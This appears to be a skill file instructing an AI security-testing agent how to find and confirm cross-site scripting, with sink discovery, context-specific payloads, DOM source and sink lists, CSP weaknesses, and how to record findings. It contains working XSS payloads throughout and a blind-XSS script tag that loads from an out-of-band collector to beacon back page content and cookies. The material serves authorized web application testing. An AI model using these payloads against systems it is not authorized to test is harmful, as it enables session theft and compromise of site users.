---
name: web-xss
description: Use when user input may reflect into HTML/JS/attributes — reflected/stored/DOM XSS with context-aware payloads, CSP review, and blind callbacks. Class xss.
---

# Cross-site scripting (XSS)

Confirm execution, not just reflection. Avoid noisy `alert(1)` spam across a live app — one context-correct proof per sink is enough. Class `xss`, CWE-79.

Per candidate: `record kind=hypothesis ... class=xss outcome=testing` before firing payloads.

## 1. Find sinks (WSTG-INPV-01 · WSTG-INPV-02)
Send a unique canary through **every** input and see where it lands — reflect testing across all params, headers, and stored fields, don't sample.
- Reflected: does the value appear in the response? `curl -s "https://TARGET/s?q=pir3dCANARY" | grep -n pir3dCANARY` and note the **context** (HTML body, tag attribute, `<script>`/JS string, URL/`href`, HTML comment, `<style>`, `<title>`/`<textarea>` rcdata, JSON).
- Stored: inputs that persist — profile, comments, filenames, log fields, `User-Agent`/`Referer` shown in an admin panel.
- DOM: trace **source → sink** in JS (section 3).

## 2. Context-aware payload (match where the canary landed)
- HTML body: `<svg onload=confirm(document.domain)>` (or `<img src=x onerror=...>`).
- Tag attribute (inside `"`/`'`): `"><svg onload=...>`; if you can't break the quote, `" autofocus onfocus=confirm(document.domain) x="`.
- Unquoted attribute: inject a space + event handler, e.g. `x onmouseover=confirm(document.domain)`.
- Inside `<script>` / JS string: `';confirm(document.domain);//` or `</script><svg onload=...>`; template literal: `${confirm(document.domain)}`.
- URL/`href`/`src`: `javascript:confirm(document.domain)`; `srcdoc` on iframes.
- Rcdata/comment/style: break out of `<title>`/`<textarea>` (`</textarea><svg onload=...>`), `--><svg onload=...>`, or CSS `expression`/`url()` contexts.
- Test which chars survive first: `'"<>\`/{}();=` and encoding variants — send them, see what's encoded in *that* context, then craft the minimum. A polyglot helps hit multiple contexts in one shot.

## 3. DOM XSS (WSTG-CLNT-01)
- Sources (attacker-controllable): `location` / `location.href` / `.search` / `.hash` / `.pathname`, `document.URL`, `document.documentURI`, `document.baseURI`, `document.referrer`, `document.cookie`, `window.name`, `history.pushState`/`replaceState` state, `URLSearchParams`, `postMessage` (`event.data`), `localStorage`/`sessionStorage`, and WebSocket messages.
- Sinks — **HTML**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/`writeln`, `DOMParser`, `Range.createContextualFragment`, jQuery `.html()`/`.append()`/`.prepend()`/`.after()`/`.before()`. **JS-exec**: `eval`, `Function`, `setTimeout`/`setInterval`(string), `script.src`/`.text`, jQuery `.globalEval()`. **URL**: `location`/`.href`/`.assign()`/`.replace()`, `a.href`, `iframe.src`, `window.open`. **Framework**: React `dangerouslySetInnerHTML`, Angular `[innerHTML]`/`bypassSecurityTrust*`, Vue `v-html`, Svelte `{@html}`.
```bash
# pull JS and grep for sinks; trace each back to a source
katana -u https://TARGET -jc -o evidence/js-urls.txt
curl -s https://TARGET/app.js | grep -nE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|Function\(|setTimeout|location\.(hash|search|href)|postMessage|dangerouslySetInnerHTML|v-html'
```
Confirm in a browser/headless (mitmproxy or claude-in-chrome) since DOM XSS never appears in the raw HTTP response: `https://TARGET/#<img src=x onerror=confirm(1)>`.

## 4. CSP review
```bash
curl -sSI https://TARGET | grep -i content-security-policy
```
Weaknesses that make XSS exploitable: `unsafe-inline`, `unsafe-eval`, `unsafe-hashes`, wildcard `*` / `data:` / `https:` in `script-src`, missing `object-src 'none'` and `base-uri` (base-tag injection), JSONP endpoints or Angular/known script gadgets on an allowlisted host, predictable/reflected/reused `nonce`, `strict-dynamic` misuse, and `report-only` mode not enforcing. A missing/weak CSP is a contributing low finding on its own (`class=misconfig`).

## 5. Blind / stored XSS (fires elsewhere, e.g. an admin view)
Use an out-of-band collector so you learn when it executes:
```
"><script src=https://OOB_ID.xss.report></script>
```
Payload beacons back DOM/cookies to your XSS Hunter / interactsh listener. Record the callback URL you used in `evidence/`.

## Confirm vs false positive (calibrate, don't discard)
- Reflection ≠ execution. Prove the JS **runs** (callback fires, `document.domain` shown, DOM changes) in the right context before `status=confirmed`.
- Check output encoding *per context*: if `<` becomes `&lt;` here, try every other context the input reaches (attribute, JS string, URL, DOM sink) before concluding — encoding safe in one place can be bypassable in another.
- Still unproven but plausible (reflects unencoded, or a source reaches a sink you couldn't trigger)? Keep it an `inconclusive` hypothesis or unconfirmed (`status=open`) finding routed via `recall gaps` — don't drop it. Only payloads sanitized in *every* reachable context are truly not exploitable.

## Wire into the loop
```
record kind=hypothesis statement="q reflects unencoded into HTML body" target=e2 class=xss approach="canary then <svg onload>" outcome=confirmed evidence=evidence/xss-reflected.http
record kind=finding title="Reflected XSS in /search?q" severity=medium target=e2 class=xss cwe=CWE-79 status=confirmed hypothesisId=y6 repro="GET /search?q=<svg onload=confirm(document.domain)>" evidence=["evidence/xss-reflected.http"]
```
Severity: stored XSS hitting other users / admins = high; reflected = medium (high if it steals session/admin); self-XSS or heavily-mitigated = low/info.

## References
- OWASP WSTG — Reflected (WSTG-INPV-01), Stored (WSTG-INPV-02), DOM-based XSS (WSTG-CLNT-01) — https://owasp.org/www-project-web-security-testing-guide/stable/
- OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP DOM based XSS Prevention Cheat Sheet (sources/sinks) — https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- PortSwigger Web Security Academy — Cross-site scripting — https://portswigger.net/web-security/cross-site-scripting
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — https://cwe.mitre.org/data/definitions/79.html
